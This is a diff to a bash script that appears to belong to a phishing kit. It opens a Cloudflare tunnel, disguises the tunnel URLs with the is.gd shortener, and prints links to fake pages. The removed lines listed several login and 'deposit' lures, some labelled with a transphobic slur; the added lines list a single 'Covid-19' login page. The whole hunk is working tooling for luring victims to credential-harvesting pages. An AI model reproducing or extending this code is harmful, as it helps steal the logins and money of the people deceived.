@@ -570,36 +570,12 @@ cloudflared_start() {
 
 	{ sleep 12; clear; header; }
 cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
-url_0="${cldflr_url}/index.php"
-url_1="${cldflr_url}/public/deposit/1.html"
-url_2="${cldflr_url}/public/deposit/manual.php"
-url_3="${cldflr_url}/login.php"
-url_4="${cldflr_url}/public/GO.php"
+url_0="${cldflr_url}/login.php"
 url0=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_0")
-url1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_1")
-url2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_2")
-url3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_3")
-url4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_4")
-echo -e "${RED}=================================================="
-echo -e "${YELLOW}ZERO-TRUST SERVER LINK [UNTOUCHED]"
-echo -e "${GREEN}$cldflr_url"
-echo -e "${RED}=================================================="
-echo -e "${YELLOW}HOME PAGE"
+echo -e "${RED}============================"
+echo -e "${WHITE}  LOGIN PAGE [Covid-19]"
 echo -e "${GREEN}$url0"
-echo -e "${RED}=================================================="
-echo -e "${YELLOW}SARAH LOGIN V4 "
-echo -e "${GREEN}$url3"
-echo -e "${RED}=================================================="
-echo -e "${YELLOW}AUTO TRANNY V2"
-echo -e "${GREEN}$url1"
-echo -e "${RED}=================================================="
-echo -e "${YELLOW}TRANSGENDER V4"
-echo -e "${GREEN}$url2"
-echo -e "${ORANGEBG}${RED}=================================================="
-echo -e "${YELLOW}META JENNY  V4 "
-echo -e "${GREEN}$url4"
-echo -e "${RED}=================================================="
-
+echo -e "${RED}==========================="
 
 }
 
